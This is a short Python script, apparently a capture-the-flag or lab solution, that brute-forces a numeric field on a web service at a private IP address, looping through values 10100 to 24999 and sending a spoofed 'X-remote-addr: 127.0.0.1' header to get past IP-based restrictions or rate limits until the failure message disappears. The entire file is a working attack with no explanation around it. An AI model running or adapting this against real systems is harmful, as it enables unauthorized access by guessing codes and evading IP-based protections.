#!/usr/bin/env python3 
import requests

for x in range(10100,25000):
    r = requests.post('http://10.10.116.226:8085', data = {'number':x}, headers= {'X-remote-addr': '127.0.0.1'})
    reply = r.text
    if "Oh no! How unlucky" in r.text:
        print('No luck at [' + str(x) + ']')
    else:
        print('Bingo at [' + str(x) + ']')
        exit()
